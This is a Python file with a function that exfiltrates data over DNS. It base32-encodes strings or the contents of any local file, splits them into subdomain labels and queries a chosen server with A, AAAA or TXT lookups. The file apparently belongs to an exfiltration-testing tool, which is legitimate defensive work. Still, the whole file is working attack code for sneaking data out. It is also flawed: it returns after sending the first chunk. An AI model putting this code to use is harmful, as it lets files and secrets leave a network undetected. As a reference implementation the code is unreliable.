import dns.query
import dns.message
import base64
import os
import logging

def ExfilDNS(server, location, data, File=False, port=53):
    logging.debug("Using DNS exfiltration")
    if not File:
        logging.debug("Data is not a file, converting to string")
        if isinstance(data, list):
            logging.debug("Data is a list, converting to string")
            data = ','.join(data)
            data = data.encode('utf-8')
        else:
            logging.debug("Data is not a list, converting to string")
            data = data.encode('utf-8')
    else:
        logging.debug("Data is a file, converting to bytes")
        if data == "":
            logging.error("No file data to exfiltrate")
            return False
        else:
            if not os.path.isfile(data):
                logging.debug("DNS testcase Filepath does not exist")
                return False
            else:
                logging.debug("Data is a file, converting to bytes")
                data = open(data, "rb").read()

    data_b32 = base64.b32encode(data).decode('utf-8').rstrip('=')

    # Split the base32 string into chunks of 52 bytes or less
    chunks = [data_b32[i:i+52] for i in range(0, len(data_b32), 52)]

    for i, chunk in enumerate(chunks):
        domain = chunk.lower() + '.' + server

        # Check that the domain name isn't too long
        if len(domain) > 253:
            logging.error(f"Domain name is too long: {len(domain)} characters")
            return False

        # Check that no label is too long
        if any(len(label) > 63 for label in domain.split('.')):
            logging.error(f"Domain name label is too long: {max(len(label) for label in domain.split('.'))} characters")
            return False

        if location == "A":
            logging.debug("Using A record")
            message = dns.message.make_query(domain, dns.rdatatype.A)
        elif location == "AAAA":
            logging.debug("Using AAAA record")
            message = dns.message.make_query(domain, dns.rdatatype.AAAA)
        elif location == "TXT":
            logging.debug("Using TXT record")
            message = dns.message.make_query(domain, dns.rdatatype.TXT)
        else:
            logging.error(f"Invalid location: {location}")
            return False

        response = None

        try:
            response = dns.query.udp(message, server, port=port)
            logging.debug("DNS response received")

            # Check if the response contains the expected data
            for answer in response.answer:
                if answer.rdtype == dns.rdatatype.A and location == "A":
                    for rdata in answer:
                        if str(rdata) == "127.0.0.1":
                            logging.debug("Expected data found in response")
                            return True
                elif answer.rdtype == dns.rdatatype.AAAA and location == "AAAA":
                    for rdata in answer:
                        if str(rdata) == "::1":
                            logging.debug("Expected data found in response")
                            return True
                elif answer.rdtype == dns.rdatatype.TXT and location == "TXT":
                    for rdata in answer:
                        if str(rdata) == f'"{domain}"':
                            logging.debug("Expected data found in response")
                            return True

            logging.debug("Expected data not found in response")
            return False
        except dns.query.BadResponse as bdr:
            # this represents true, the DNS server responded with a valid response
            # TODO: fix the server so that this error doesnt trigger
            logging.debug("Bad DNS response received: %s", bdr)
            logging.debug("Query: %s", message.to_text())
            logging.debug("Response: %s", response and response.to_text())
            return False

